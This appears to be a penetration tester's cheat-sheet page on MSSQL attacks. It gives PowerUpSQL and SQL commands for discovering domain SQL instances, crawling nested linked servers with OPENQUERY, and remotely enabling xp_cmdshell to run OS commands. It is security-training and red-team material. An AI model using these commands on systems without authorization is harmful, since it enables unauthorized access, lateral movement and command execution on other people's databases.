# MSSQL DB - T1433,U1434

### BruteForce

### Enumeration

* [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

{% tabs %}
{% tab title="PowerUpSQL" %}
{% code lineNumbers="true" %}
```powershell
//Discovery (SPN Scanning)
Get-SQLInstanceDomain
//Check Accessibility
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
//Gather Information
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```
{% endcode %}
{% endtab %}

{% tab title="Manual" %}

{% endtab %}
{% endtabs %}

### Linked SQL Servers Enumeration

* [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

{% tabs %}
{% tab title="PowerUpSQL" %}
```
Get-SQLServerLink -Instance <server-name> -Verbose
//Nested Enumeration
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
```
{% endtab %}

{% tab title="Manual" %}
```
SELECT * FROM master..sysservers
SELECT * FROM OPENQUERY("<link-server1>", 'SELECT * FROM master..sysservers')
//Nested Enumeration
SELECT * FROM OPENQUERY("<link-server1>",'SELECT * FROM OPENQUERY(''<link-server2>'',''SELECT * FROM master..sysservers'')')
```
{% endtab %}
{% endtabs %}

#### Executing OS Commands

* Enable `xp_cmdshell` Remotely (if `rpcout` is enabled)
  * `EXECUTE('sp_configure "xp_cmdshell", 1; RECONFIGURE;') AT "<server>"`
  * `EXECUTE('xp_cmdshell "whoami"') AT "server"`
